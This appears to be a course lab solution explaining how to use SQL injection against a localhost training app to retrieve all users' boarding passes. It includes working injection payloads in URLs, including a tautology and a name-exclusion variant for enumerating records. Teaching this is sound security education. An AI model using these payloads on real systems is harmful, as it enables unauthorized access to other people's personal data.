> ***Note:*** This is just *one possible solution* of many! Any solution that lets you programmatically access boarding passes of all other users is totally acceptable!

Let's think about our single-user solution:
```
http://localhost:8080/confirmation/01729222'%20OR%20'1'='1
```

This ultimately feeds the following string into the SQL statement:
```
01729222' OR '1'='1
```

This results in us receiving the boarding pass of "Hannah Rodriguez", although *really* what's happening is that the SQL query is returning *all* users and the app is dropping all but the first.

What happens if we manually hardcode an exception for "Hannah Rodriguez" into our URL string? For example:
```
01729222' OR ('1'='1' AND name != 'Hannah Rodriguez') OR '1'='2
```

(Remember we must end with an un-terminated string! In the above, we satisfy this with the "open" ```'2```.)

Trying this out, we can send a request to [http://localhost:8080/confirmation/01729222'%20OR%20('1'='1'%20AND%20name%20!=%20'Hannah%20Rodriguez')%20OR%20'1'='2](http://localhost:8080/confirmation/01729222'%20OR%20('1'='1'%20AND%20name%20!=%20'Hannah%20Rodriguez')%20OR%20'1'='2) and ultimately receive a new boarding pass!

![boarding pass 3](https://git.generalassemb.ly/andymartin/cybersecurity/blob/master/day-three/sql-lesson/screenshots/boarding_pass_3.jpeg?raw=true)

We can now programmatically exclude previously observed usernames to eventually pull in all boarding passes in the database!
